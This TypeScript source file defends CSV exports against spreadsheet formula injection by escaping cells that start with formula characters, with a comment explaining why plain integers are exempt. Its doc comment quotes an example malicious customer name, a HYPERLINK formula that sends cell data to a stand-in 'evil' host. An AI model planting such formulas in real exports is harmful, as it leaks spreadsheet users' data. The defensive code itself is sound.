/**
 * Leading characters that make Excel, LibreOffice Calc and Google Sheets parse a
 * cell as a *formula* instead of text when a CSV is opened. Quoting the field
 * does not help: `"=1+1"` is still evaluated.
 */
const FORMULA_TRIGGER = /^[=+\-@\t\r]/;

/**
 * Neutralizes spreadsheet formula injection (OWASP "CSV injection").
 *
 * Customer-controlled strings (names, addresses, product titles, campaign names)
 * reach our CSV exports verbatim, so a customer called
 * `=HYPERLINK("http://evil/?d="&A1,"click")` would otherwise get a live formula
 * in the shop owner's spreadsheet.
 *
 * The mitigation is the standard one: prefix a single apostrophe, which every
 * major spreadsheet treats as "the rest of this cell is text" and strips from
 * the displayed value.
 *
 * Plain integers (optionally negative) are deliberately exempt. A value matching
 * `^-?\d+$` cannot be a formula — a formula needs an operator, function or cell
 * reference, none of which can appear in a pure integer literal — so exempting
 * it costs nothing in security while preserving numeric cell typing. This
 * matters: money columns in the accounting export are legitimately negative
 * (cogs, shipping fees, ad spend), and prefixing them would land them as *text*,
 * silently breaking `SUM()` in the shop owner's spreadsheet.
 */
const PLAIN_INTEGER = /^-?\d+$/;

export function neutralizeSpreadsheetFormula(value: string): string {
  if (PLAIN_INTEGER.test(value)) {
    return value;
  }
  return FORMULA_TRIGGER.test(value) ? `'${value}` : value;
}
